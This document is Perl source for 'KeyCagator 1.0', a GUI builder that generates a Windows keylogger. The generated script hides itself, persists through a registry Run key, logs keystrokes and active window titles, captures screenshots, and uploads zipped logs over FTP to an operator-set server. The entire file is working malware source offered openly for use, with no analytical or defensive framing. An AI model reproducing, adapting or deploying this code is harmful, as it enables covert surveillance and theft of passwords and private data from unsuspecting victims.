#!usr/bin/perl
#Project KeyCagator 1.0
#Coded By Doddy H
#Keylogger based on http://dl.packetstormsecurity.net/trojans/win-keylogger.txt
#Thanks to Mdh3ll for create and share the first keylogger in Perl
#ppm install http://www.bribes.org/perl/ppm/Win32-API.ppd
#ppm install http://www.bribes.org/perl/ppm/Win32-GuiTest.ppd

use Tk;
use Tk::Dialog;

my $color_fondo = "black";
my $color_texto = "green";

if ( $^O eq 'MSWin32' ) {
    use Win32::Console;
    Win32::Console::Free();
}

my $winkey =
  MainWindow->new( -background => $color_fondo, -foreground => $color_texto );
$winkey->title("KeyCagator 1.0 (C) Doddy Hackman 2012");
$winkey->resizable( 0, 0 );
$winkey->geometry("370x500+20+20");

$winkey->Label(
    -text       => "-- == Logs == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 120, -y => 20 );
$winkey->Label(
    -text       => "Directory : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 60 );
my $dir_sta = $winkey->Entry(
    -text       => "c:/windows/PROBANDO_KEYLOGGERR",
    -width      => 40,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 95, -y => 65 );
$winkey->Label(
    -text       => "Update logs each",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 90 );
my $time_sta = $winkey->Entry(
    -text       => "30",
    -width      => 10,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 140, -y => 95 );
$winkey->Label(
    -text       => "seconds",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 210, -y => 90 );

$winkey->Label(
    -text       => "-- == FTP == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 120, -y => 130 );
$winkey->Label(
    -text       => "Host : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 170 );
my $host_sta = $winkey->Entry(
    -text       => "localhost",
    -width      => 25,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 64, -y => 175 );
$winkey->Label(
    -text       => "Username : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 200 );
my $user_sta = $winkey->Entry(
    -text       => "doddy",
    -width      => 25,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 100, -y => 205 );
$winkey->Label(
    -text       => "Password : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 230 );
my $pass_sta = $winkey->Entry(
    -text       => "doddy",
    -show       => "*",
    -width      => 25,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 98, -y => 235 );
$winkey->Label(
    -text       => "Directory : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 260 );
my $dirftp_sta = $winkey->Entry(
    -text       => "/",
    -width      => 25,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 96, -y => 265 );

$winkey->Label(
    -text       => "-- == Options == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 119, -y => 300 );
$winkey->Checkbutton(
    -text             => "FTP Service",
    -font             => "Impact",
    -variable         => \$ftp_sta,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 20, -y => 340 );
$winkey->Checkbutton(
    -text             => "Detect mouse click to capture screen",
    -font             => "Impact",
    -variable         => \$mouseclick_sta,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 20, -y => 370 );
$ima_sta = $winkey->Checkbutton(
    -text             => "Screen capture each",
    -font             => "Impact",
    -variable         => \$foto_sta,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 20, -y => 400 );
$ima_sta->select();
my $fotocada_sta = $winkey->Entry(
    -text       => "20",
    -width      => 10,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 185, -y => 405 );
$winkey->Label(
    -text       => "seconds",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 255, -y => 400 );

$winkey->Button(
    -text             => "Generate !",
    -width            => 30,
    -font             => "Impact",
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto,
    -command          => \&gen
)->place( -x => 50, -y => 450 );

MainLoop;

sub gen {

    my $codigo_key = q(#!usr/bin/perl
#KeyCagator 1.0
#Coded By Doddy H
#Keylogger based on http://dl.packetstormsecurity.net/trojans/win-keylogger.txt
#Thanks to Mdh3ll for create and share the first keylogger in Perl
#ppm install http://www.bribes.org/perl/ppm/Win32-API.ppd
#ppm install http://www.bribes.org/perl/ppm/Win32-GuiTest.ppd
#For compile to exe : perl2exe -gui keycagator.pl

use Win32::GuiTest
  qw(GetAsyncKeyState GetForegroundWindow GetWindowText FindWindowLike SetForegroundWindow SendKeys);
use Win32::API;
use Win32::Clipboard;
use Win32::File;
use IO::Socket;
use Archive::Zip;
use File::Basename;
use Net::FTP;
use Win32::TieRegistry( Delimiter => "/" );

use threads;

my $dir_hide = "DIRECTORIO_A_ESCONDER";

my $screen_60      = "SCREEN_CADA_60";
my $screen_60_time = "SCREEN_TIME_CADA_60";

my $screen_click = "SCREEN_CADA_CLICK";

my $ftp_on   = "FTP_ESTADO";
my $ftp_host = "HOST_FTP";
my $ftp_user = "USER_FTP";
my $ftp_pass = "USER_PASSWORD";
my $ftp_dir  = "FTP_DIRECTORIO";

my $logs_up = "ACTUALIZAR_LOGS";

unless ( -d $dir_hide ) {
    mkdir( $dir_hide, 777 );
    hideit( $dir_hide, "hide" );
    chdir($dir_hide);
}
else {
    chdir($dir_hide);
}

hideit($0,"hide");

##Infect
Win32::CopyFile( $0, $dir_hide . "/" . basename($0), 0 );
hideit( $dir_hide . "/" . basename($0), "hide" );
$Registry->{"LMachine/Software/Microsoft/Windows/CurrentVersion/Run//system33"}
  = $dir_hide . "/" . basename($0);

#

my $comando1 = threads->new( \&capturar_teclas );
my $comando2 = threads->new( \&updatelogs );
if ( $screen_60 eq "1" ) {
    my $comando3 = threads->new( \&capturar_pantallas );
}

$comando1->join();

sub updatelogs {

    while (1) {

        sleep $logs_up;

##

        my $logs = getmyip();

        my $zip = Archive::Zip->new();

        $zip->addFile("logs_now.html");

        opendir( HIDE, $dir_hide );
        my @archivos = readdir HIDE;
        for my $archivo (@archivos) {
            if ( -f $dir_hide . "/" . $archivo ) {
                if ( $archivo =~ /\.bmp/ ) {
                    my $final = $dir_hide . "/" . $archivo;
                    $zip->addFile( $final, basename($final) );
                }
            }
        }
        close(HIDE);

        if ( $zip->writeToFileNamed($logs) == AZ_OK ) {

            if ( $ftp_on eq "1" ) {

                $ftp = Net::FTP->new($ftp_host);
                $ftp->login( $ftp_user, $ftp_pass );
                $ftp->mkdir($ftp_dir);
                $ftp->cwd($ftp_dir);
                $ftp->binary();
                $ftp->put($logs);
                $ftp->close();

                unlink($logs);

            }
        }

##

    }
}

sub capturar_pantalla {

    my $numero = time() . rand();

    SendKeys("%{PRTSCR}");

    my $a = Win32::Clipboard::GetBitmap();

    open( FOTO, ">" . $numero . ".bmp" );
    binmode(FOTO);
    print FOTO $a;
    close FOTO;

    hideit( $numero . ".bmp", "hide" );

    savefile(
        "<br><br><center><img src='" . $numero . ".bmp" . "'></center><br><br>",
        "asinoma"
    );

}

sub capturar_pantallas {

    while (1) {

        sleep $screen_60_time;

        capturar_pantalla();

    }
}

sub capturar_teclas {

    Win32::API->Import( "user32", "GetKeyState", "I", "I" );

    $|++;

    while (true) {

        my %numeros_izquierda = (
            48 => "0",
            49 => "1",
            50 => "2",
            51 => "3",
            52 => "4",
            53 => "5",
            54 => "6",
            55 => "7",
            56 => "8",
            57 => "9"
        );

        my %numeros_derecha = (
            96  => "0",
            97  => "1",
            98  => "2",
            99  => "3",
            100 => "4",
            101 => "5",
            102 => "6",
            103 => "7",
            104 => "8",
            105 => "9"
        );

        %signos_shift = (
            48  => ")",
            49  => "!",
            50  => "@",
            51  => "#",
            52  => "\$",    ##
            53  => "%",
            54  => "¨",
            55  => "&",
            56  => "*",
            57  => "(",
            187 => "+",
            188 => "<",
            189 => "_",
            190 => ">",
            191 => ":",
            192 => "\"",    ##
            193 => "?",
            291 => "/\'",
            220 => "}",
            221 => "{",
            222 => "^",
            226 => "|"
        );

        my %teclas_raras = (
            1    => "[click mouse]",
            8    => "<br>[backspace]<br>",
            13   => "<br>[enter]<br>",       #ENTER
            "16" => "Shift",
            32   => "<br>[space]<br>",
            46   => "<br>[suprimir]<br>",
            187  => "=",
            188  => ",",
            189  => "-",
            190  => ".",
            191  => ";",
            192  => "\'",
            193  => "/",
            219  => "\\\'",
            220  => "]",
            221  => "[",
            222  => "~",
            226  => "\/"
        );

        capturar_ventanas();

        unless ( GetKeyState(20) ne 0 ) {
            $mayus = 32;
        }
        else {
            $mayus = 0;
        }

##Teclas raras
        for my $teca ( sort { $a <=> $b } keys %teclas_raras ) {
            if ( dame($teca) ) {
                if ( $teca == 16 ) {

                    # SHIFT

                    $on = 1;

                    while ( $on eq 1 ) {

                        for my $shisig ( sort { $c <=> $d } keys %signos_shift )
                        {
                            if ( dame($shisig) ) {
                                if ( defined $signos_shift{$shisig} ) {
                                    savefile( $signos_shift{$shisig},
                                        "asinoma" );
                                }

                            }
                        }

##Letras A-Z con shift
                        for my $letra ( 65 .. 90 ) {
                            if ( dame($letra) ) {
                                savefile( $letra + "0" );
                            }
                        }

                        #

                        unless ( !GetAsyncKeyState(16) ne 1 ) {
                            $on = 0;
                        }

                    }

                    #

                }
                elsif ( $teca == "1" ) {
                    if ( $screen_click eq "1" ) {
                        capturar_pantalla( time() . rand() );
                    }

                    #fotonow
                }
                elsif ( defined $teclas_raras{$teca} ) {
                    savefile( $teclas_raras{$teca}, "asinoma" );
                }
            }
        }
##

## Numeros izquierda
        for my $num_iz ( sort { $a <=> $b } keys %numeros_izquierda ) {
            if ( dame($num_iz) ) {
                if ( defined $numeros_izquierda{$num_iz} ) {
                    savefile( $numeros_izquierda{$num_iz}, "asinoma" );
                }

            }
        }
##

## Numeros derecha
        for my $num_de ( sort { $a <=> $b } keys %numeros_derecha ) {
            if ( dame($num_de) ) {
                if ( defined $numeros_derecha{$num_de} ) {
                    savefile( $numeros_derecha{$num_de}, "asinoma" );
                }

            }
        }

##Letras A-Z

        for my $letra ( 65 .. 90 ) {
            if ( dame($letra) ) {
                savefile( $letra + $mayus );
            }
        }

##

    }

    sub savefile {

        open( LOGS, ">>logs_now.html" );

        if ( $_[1] ne "asinoma" ) {
            print LOGS chr( $_[0] );
        }
        else {
            print LOGS $_[0];
        }

        close(LOGS);

        hideit( "logs_now.html", "hide" );

    }

    sub dame {
        if ( GetAsyncKeyState( $_[0] ) eq -32767 ) {
            return 1;
        }
        else {
            return 0;
        }
    }

    sub capturar_ventanas {
        my $win1 = GetForegroundWindow();
        if ( $win1 != $win2 ) {
            $win2 = $win1;
            my $nombre = GetWindowText($win1);
            chomp($nombre);
            if ( $nombre ne "" ) {
                savefile(
                    "<br><br><center><b>[window] : " 
                      . $nombre
                      . "</center></b><br><br>",
                    "asinoma"
                );
            }
        }
    }

}    # Funcion capturar teclas

sub hideit {
    if ( $_[1] eq "show" ) {
        Win32::File::SetAttributes( $_[0], NORMAL );
    }
    elsif ( $_[1] eq "hide" ) {
        Win32::File::SetAttributes( $_[0], HIDDEN );
    }
}

sub getmyip {
    my $get = gethostbyname("");
    return ( inet_ntoa($get) . ".zip" );
}

#The End ?);

    my (
        $dir_hide, $time_logs, $ftp_host, $ftp_user,
        $ftp_pass, $ftp_dir,   $foto_cada
      )
      = (
        $dir_sta->get,  $time_sta->get, $host_sta->get,
        $user_sta->get, $pass_sta->get, $dirftp_sta->get,
        $fotocada_sta->get
      );

    $codigo_key =~ s/DIRECTORIO_A_ESCONDER/$dir_hide/;
    if ( $foto_sta eq 1 ) {
        $codigo_key =~ s/SCREEN_CADA_60/1/;
        $codigo_key =~ s/SCREEN_TIME_CADA_60/$foto_cada/;
    }
    else {
        $codigo_key =~ s/SCREEN_CADA_60/0/;
        $codigo_key =~ s/SCREEN_TIME_CADA_60/$foto_cada/;
    }
    if ( $mouseclick_sta eq 1 ) {
        $codigo_key =~ s/SCREEN_CADA_CLICK/1/;
    }
    else {
        $codigo_key =~ s/SCREEN_CADA_CLICK/0/;
    }

    if ( $ftp_sta eq 1 ) {
        $codigo_key =~ s/FTP_ESTADO/1/;
        $codigo_key =~ s/HOST_FTP/$ftp_host/;
        $codigo_key =~ s/USER_FTP/$ftp_user/;
        $codigo_key =~ s/USER_PASSWORD/$ftp_pass/;
        $codigo_key =~ s/FTP_DIRECTORIO/$ftp_dir/;
    }
    else {
        $codigo_key =~ s/FTP_ESTADO/0/;
    }

    $codigo_key =~ s/ACTUALIZAR_LOGS/$time_logs/;

    if ( -f "keycagator.pl" ) {
        unlink("keycagator.pl");
    }

    open( KEY, ">>keycagator.pl" );
    print KEY $codigo_key;
    close KEY;

    $winkey->Dialog(
        -title            => "Oh Yeah",
        -buttons          => ["OK"],
        -text             => "Enjoy this keylogger",
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->Show();

}

#The End ?